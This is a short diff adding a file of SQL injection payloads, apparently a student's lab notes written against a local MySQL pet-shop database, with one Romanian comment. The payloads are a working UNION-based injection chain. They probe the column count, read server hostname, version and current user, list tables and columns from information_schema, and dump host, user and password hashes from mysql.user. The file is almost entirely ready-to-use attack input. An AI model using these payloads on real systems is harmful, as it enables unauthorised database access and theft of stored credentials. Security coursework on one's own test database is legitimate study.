@@ -1,0 +1,19 @@
+' order by 1#
+
+' order by 11#
+
+' order by 12# eroare //avem doar 11 coloane in baza de date locala
+
+' union select 1, @@hostname, @@hostname, @@datadir, @@version, @@basedir, 7, 8, 9, 10, 11#
+
+' union select 1, current_user(), system_user(), session_user(), session_user(), 6, 7, 8, 9, 10, 11#
+
+' union select 1, user(), database(), version(), schema(), UUID(), 7, 8, 9, 10, 11#
+
+' union select 1, table_name, table_name, table_name, table_name, table_name, 7, 8, 9, 10, 11 from information_schema.tables where table_schema="magazin_saw"#
+
+' union select 1, column_name, column_name, column_name, column_name, column_name, 7, 8, 9, 10, 11 from information_schema.columns where table_name="produse_petshop"#
+
+' union select 1, host, user, password, user, password, 7, 8, 9, 10, 11 from mysql.user#
+
+' union select 1, nume, categorie, pret, imagine, c1, c2, c3, c4, c5, creation_date from produse_petshop#
